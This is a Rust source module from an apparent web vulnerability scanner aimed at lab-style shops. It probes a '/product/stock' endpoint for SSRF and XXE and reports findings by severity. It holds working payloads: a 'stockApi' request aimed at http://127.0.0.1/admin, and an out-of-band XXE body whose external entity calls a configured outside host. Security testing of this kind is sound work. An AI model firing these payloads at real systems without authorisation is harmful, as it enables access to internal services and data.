//! SSRF and XXE reconnaissance:
//! product stock endpoint, stockCheck.js, XXE via XML body.

use std::sync::Arc;

use crate::{
    output::{Finding, Severity},
    scanner::ScanContext,
};

pub async fn run(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    ctx.out.info("Checking for SSRF / XXE vectors…");

    let (ssrf_f, stock_js_f, oob_f) =
        tokio::join!(check_ssrf_stock(ctx), check_stock_js(ctx), check_ssrf_oob(ctx));

    let mut findings = Vec::new();
    findings.extend(ssrf_f);
    findings.extend(stock_js_f);
    findings.extend(oob_f);
    findings
}

/// POST /product/stock — classic SSRF via stockApi / productId parameters.
async fn check_ssrf_stock(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    // First check the endpoint exists
    let Ok(r) = ctx
        .client
        .post(ctx.url("/product/stock"))
        .form(&[("productId", "1"), ("storeId", "1")])
        .send()
        .await
    else {
        return findings;
    };

    if r.status().is_success() || r.status().as_u16() == 400 {
        let f = Finding::new(
            Severity::Medium,
            "SSRF",
            "Product stock endpoint (/product/stock) accepts server-side requests — test for SSRF via stockApi / productId",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }

    // Also try with a stockApi parameter (older lab format)
    let Ok(r2) = ctx
        .client
        .post(ctx.url("/product/stock"))
        .form(&[("stockApi", "http://127.0.0.1/admin")])
        .send()
        .await
    else {
        return findings;
    };

    if r2.status().is_success() {
        let body = r2.text().await.unwrap_or_default();
        let sev = if body.contains("admin") || body.contains("users") {
            Severity::High
        } else {
            Severity::Medium
        };
        let f = Finding::new(
            sev,
            "SSRF",
            "stockApi parameter triggers SSRF — internal request returned non-error response",
        );
        ctx.out.finding(&f);
        findings.push(f);
    }
    findings
}

/// /resources/js/stockCheck.js indicates XML-based stock check (XXE / SSRF via XML body).
async fn check_stock_js(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();
    match ctx.client.get(ctx.url("/resources/js/stockCheck.js")).send().await {
        Ok(r) if r.status().is_success() => {
            let body = r.text().await.unwrap_or_default();
            let is_xml = body.contains("xml") || body.contains("XML") || body.contains("XMLHttpRequest");
            let sev = if is_xml { Severity::High } else { Severity::Medium };
            let f = Finding::new(
                sev,
                "SSRF / XXE",
                "stockCheck.js found — stock check uses JavaScript XHR, likely XML body → XXE or SSRF",
            );
            ctx.out.finding(&f);
            findings.push(f);
        }
        Ok(_) | Err(_) => {}
    }
    findings
}

/// Send OOB SSRF probes to the configured out-of-band URL (e.g. Burp Collaborator / Interactsh).
///
/// Fires `stockApi=<oob_url>` at `/product/stock` and an XXE payload at `/product/stock` with
/// XML body. The response itself is not meaningful — check your OOB platform for interactions.
async fn check_ssrf_oob(ctx: &Arc<ScanContext>) -> Vec<Finding> {
    let mut findings = Vec::new();

    let Some(ref oob_url) = ctx.config.oob_url else {
        return findings;
    };

    ctx.out.info(&format!("Sending OOB SSRF probes to {oob_url}…"));

    // 1. stockApi parameter probe
    let stock_result = ctx
        .client
        .post(ctx.url("/product/stock"))
        .form(&[("stockApi", oob_url.as_str())])
        .send()
        .await;

    match stock_result {
        Ok(r) => {
            let status = r.status();
            if status.is_success() || status.is_redirection() {
                let f = Finding::new(
                    Severity::Info,
                    "SSRF (OOB probe)",
                    format!("OOB SSRF probe sent via stockApi to {oob_url} — HTTP {status} (check OOB platform)"),
                );
                ctx.out.finding(&f);
                findings.push(f);
            } else {
                ctx.out.warn(&format!(
                    "OOB stockApi probe returned HTTP {status} — /product/stock endpoint absent, skipping"
                ));
            }
        }
        Err(e) => ctx.out.warn(&format!("OOB stockApi probe failed: {e}")),
    }

    // 2. XXE via XML body probe (blind out-of-band)
    let xxe_body = format!(
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\
         <!DOCTYPE foo [<!ENTITY xxe SYSTEM \"{oob_url}\">]>\
         <stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>"
    );

    let xxe_result = ctx
        .client
        .post(ctx.url("/product/stock"))
        .header("Content-Type", "application/xml")
        .body(xxe_body)
        .send()
        .await;

    match xxe_result {
        Ok(r) => {
            let status = r.status();
            if status.is_success() || status.is_redirection() {
                let f = Finding::new(
                    Severity::Info,
                    "XXE (OOB probe)",
                    format!("OOB XXE probe sent via XML body to {oob_url} — HTTP {status} (check OOB platform)"),
                );
                ctx.out.finding(&f);
                findings.push(f);
            } else {
                ctx.out.warn(&format!(
                    "OOB XXE probe returned HTTP {status} — XML endpoint absent, skipping"
                ));
            }
        }
        Err(e) => ctx.out.warn(&format!("OOB XXE probe failed: {e}")),
    }

    findings
}
